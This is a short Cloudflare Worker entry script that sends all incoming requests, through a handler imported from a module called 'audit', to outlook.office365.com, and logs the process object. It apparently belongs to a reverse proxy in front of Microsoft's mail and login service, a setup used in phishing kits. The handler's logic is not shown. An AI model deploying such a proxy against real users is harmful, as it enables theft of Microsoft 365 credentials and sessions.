import { handleRequest } from './audit'

const Domain = 'outlook.office365.com'

addEventListener('fetch', (event) => {
  console.log({data:process});
  
  event.passThroughOnException()
  event.respondWith(handleRequest(event.request, Domain))
})
